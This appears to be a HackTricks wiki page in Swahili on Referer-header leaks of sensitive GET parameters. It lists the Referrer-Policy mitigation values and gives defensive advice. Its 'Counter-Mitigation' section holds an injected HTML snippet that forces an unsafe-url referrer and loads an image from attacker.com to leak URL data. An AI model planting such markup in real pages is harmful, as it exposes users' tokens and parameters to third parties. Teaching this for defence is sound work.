{{#include ./banners/hacktricks-training.md}}

# Referrer headers and policy

Referrer ni kichwa kinachotumiwa na vivinjari kuonyesha ni ipi ilikuwa ukurasa wa awali ulitembelewa.

## Taarifa nyeti zilizovuja

Ikiwa katika wakati fulani ndani ya ukurasa wa wavuti taarifa nyeti ziko kwenye vigezo vya ombi la GET, ikiwa ukurasa una viungo vya vyanzo vya nje au mshambuliaji anaweza kufanya/kupendekeza (social engineering) mtumiaji kutembelea URL inayodhibitiwa na mshambuliaji. Inaweza kuwa na uwezo wa kutoa taarifa nyeti ndani ya ombi la hivi karibuni la GET.

## Mitigation

Unaweza kufanya kivinjari kufuata **Referrer-policy** ambayo inaweza **kuepusha** taarifa nyeti kutumwa kwa programu nyingine za wavuti:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

Unaweza kubadilisha sheria hii kwa kutumia tag ya meta ya HTML (mshambuliaji anahitaji kutumia na kuingiza HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Ulinzi

Kamwe usiweke data nyeti ndani ya vigezo vya GET au njia katika URL. 

{{#include ./banners/hacktricks-training.md}}
